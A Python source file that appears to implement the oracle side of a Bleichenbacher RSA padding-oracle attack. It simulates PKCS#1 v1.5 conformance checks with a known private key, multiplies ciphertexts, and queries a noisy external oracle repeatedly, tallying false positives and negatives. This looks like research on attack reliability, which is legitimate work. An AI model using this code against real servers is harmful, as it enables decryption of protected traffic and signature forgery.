
from binascii import *
import time
from bleich_vals import *
from pdb import set_trace
from Crypto.Util.number import bytes_to_long, long_to_bytes

B = 2**2032 #for 256 bytes

B2 = 2*B
B3 = 3*B


def myceil(x,y):
    return x//y +(x%y != 0)


def myfloor(x,y):
    return x//y



class PaddingOracleAnyLength():
    """
    Creates oracle state including oracle call function. Allows the comparison of the oracle query and the simulated query.
    Includes query repetition methods.
    """
    def __init__(self, onCT=False, onExternal = False, externalOracleCall= None, withExternalAndComparison=False, withExternalTripleAndComparison = False, withExternalPosComparison = False, withVal = False) -> None:
        self.qcount = 0
        self.simqcount = 0
        self.onCT = onCT
        self.FalsePositives = 0
        self.FalsePositivesLocation = []
        self.FalseNegatives = 0
        self.CorrectPositives = 0
        self.withVal = withVal
        self.qfrompositive = 0
        self.qfrompositive_list = []
        
        self.CorrectNegatives = 0
        self.TillNextTrue = []
        self.QueriesSinceLastTrue = 0
        if self.onCT:
            self.perform_query = self.perform_query_on_enc
            self.multiply = self.multiply_and_enc_msg
        else:
            self.perform_query = self.perform_query_on_dec
            self.multiply = self.multiply_msg

        self.onExternal = onExternal
        self.ExternalAndComparison = withExternalAndComparison
        self.withExternalTripleAndComparison = withExternalTripleAndComparison
        self.withExternalPosComparison = withExternalPosComparison
        if onExternal:
            self.external_query = externalOracleCall
            self.perform_query = self.perform_external_query
        if withExternalAndComparison:
            self.external_query = externalOracleCall
            self.perform_query = self.perform_external_query_and_compare
        if withExternalTripleAndComparison:

            self.external_query = externalOracleCall
            self.perform_query = self.perform_external_query_and_compare_repeated2
        if withExternalPosComparison:
            self.external_query = externalOracleCall
            self.perform_query = self.perform_external_query_and_compare_repeatedpos



    def perform_query_on_dec(self, msg_to_check, error_callback):
        self.simqcount += 1
        #PaddingOracleAnyLength.qcount+=1

        rr = hexlify(unhexlify('%0512x' % msg_to_check))
        if rr[:4] == b'0002':
            
            if b'\x00' in long_to_bytes(msg_to_check)[1:]:
                self.qfrompositive_list.append(self.qfrompositive)
                self.qfrompositive = 0
                return True
            else:
                self.qfrompositive+=1
                return False
        else:
            self.qfrompositive+=1
            return False
    
    def perform_query_on_enc(self, msg_to_check, error_callback):
        dec_msg = pow(msg_to_check, lala_d, lala_n)
        return self.perform_query_on_dec(dec_msg, error_callback)

    
    def multiply_msg(self, msg, multiplier):
        new_msg =  (multiplier*msg)%lala_n
        return new_msg

    
    def multiply_and_enc_msg(self, msg, multiplier):
        new_msg =  (pow(multiplier, lala_e, lala_n)*msg)%lala_n
        return new_msg


    def perform_external_query(self, msg_to_check, error_callback):
        self.qcount += 1
        return self.external_query(msg_to_check, error_callback)


    def perform_external_query_and_compare(self, msg_to_check, error_callback):
        ext_res = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
        sim_res = self.perform_query_on_enc(msg_to_check, error_callback)

        self.QueriesSinceLastTrue += 1
        if ext_res != sim_res:
            if ext_res:
                self.FalsePositives += 1
                print("Found false positive")
            else:
                self.FalseNegatives += 1
                print("Found false negative")
                #self.TillNextTrue.append(self.QueriesSinceLastTrue)
                #self.QueriesSinceLastTrue = 0
        if sim_res:
            self.TillNextTrue.append(self.QueriesSinceLastTrue)
            self.QueriesSinceLastTrue = 0
        return ext_res


    def perform_external_query_and_compare_repeatedpos(self, msg_to_check, error_callback):
        """Repeats queries when the oracle result is positive in order to limit the probability of a false positive"""
        ext_res1 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
        reps = 1
        if self.withVal:
            if ext_res1 >= 2:#4:#4:#3:#2:
                time.sleep(0.2)
                ext_res = True
            elif ext_res1 == 0:
                ext_res = False
            else: 
                for i in range(4):
                    time.sleep(0.2)
                    ext_res_cur = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
                    if ext_res_cur >= 1: #2:
                        ext_res = True
                        break
                else:
                    ext_res = False

        if not self.withVal:
            if ext_res1:
                time.sleep(0.3)#5)
                ext_res2 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
                if ext_res2 != ext_res1:
                    ext_res = False
                    time.sleep(0.3)#5)
                else:
                    time.sleep(0.3)#5)
   
                    ext_res = True

                
            else:
                ext_res = ext_res1
        sim_res = self.perform_query_on_enc(msg_to_check, error_callback)
        
        if ext_res != sim_res:
            if ext_res:
                self.FalsePositives += 1

                self.FalsePositivesLocation += [self.simqcount]
                print("Found false positive")
                print("Queries up till now %d" %(self.qcount, ))
            else:
                self.FalseNegatives += 1
                print("Found false negative")
                print("Queries up till now %d" %(self.qcount, ))
               
        else:
            if ext_res:
                self.CorrectPositives += 1
            else:
                self.CorrectNegatives += 1
        return ext_res

    def perform_external_query_and_compare_repeatedpos_2_3_5(self, msg_to_check, error_callback):
        """Repeats queries when the oracle result is positive in order to limit the probability of a false positive"""
        ext_res1 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
        
        if ext_res1:
            ext_res2 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
            if ext_res1 != ext_res2:

                ext_res3 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
               
                ress = [ext_res1, ext_res2, ext_res3]
                if sum(ress) >= 2:                    
                    ext_res = True
                        

                else:
                    ext_res = False
                    ext_res4 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query                    
                    ext_res5 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
                    ress = [ext_res1, ext_res2, ext_res3, ext_res4, ext_res5]
                    if sum(ress) >= 3:                 
                        ext_res = True

            else:
                ext_res = ext_res1
                ress = [ext_res1, ext_res2]
        else:
            ext_res = ext_res1

        sim_res = self.perform_query_on_enc(msg_to_check, error_callback)
        
        if ext_res != sim_res:
            if ext_res:
                self.FalsePositives += 1
                print("Found false positive")
                print("Queries up till now %d" %(self.qcount, ))
            else:
                self.FalseNegatives += 1
                print("Found false negative")
                print("Queries up till now %d" %(self.qcount, ))
               
        return ext_res





    def perform_external_query_and_compare_repeated2(self, msg_to_check, error_callback):
        ext_res1 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
        ext_res2 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
        if ext_res1 != ext_res2:
            ext_res = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
        else:
            ext_res = ext_res1
   

        sim_res = self.perform_query_on_enc(msg_to_check, error_callback)
        
        if ext_res != sim_res:
            if ext_res:
                self.FalsePositives += 1
                print("Found false positive")
            else:
                self.FalseNegatives += 1
                print("Found false negative")
        return ext_res



    def perform_external_query_and_compare_repeated3(self, msg_to_check, error_callback):
        ext_res1 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
        ext_res2 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
        ext_res3 = self.perform_external_query(msg_to_check, error_callback) #self.perform_external_query
        ress = [ext_res1, ext_res2, ext_res3]
        if sum(ress) >= 2:
            ext_res = True
        else:
            ext_res = False

        sim_res = self.perform_query_on_enc(msg_to_check, error_callback)
        if ext_res != sim_res:
            if ext_res:
                self.FalsePositives += 1
                print("Found false positive")
                print("Queries up till now %d" %(self.qcount, ))
            else:
                self.FalseNegatives += 1
                print("Found false negative")
                print("Queries up till now %d" %(self.qcount, ))
        return ext_res
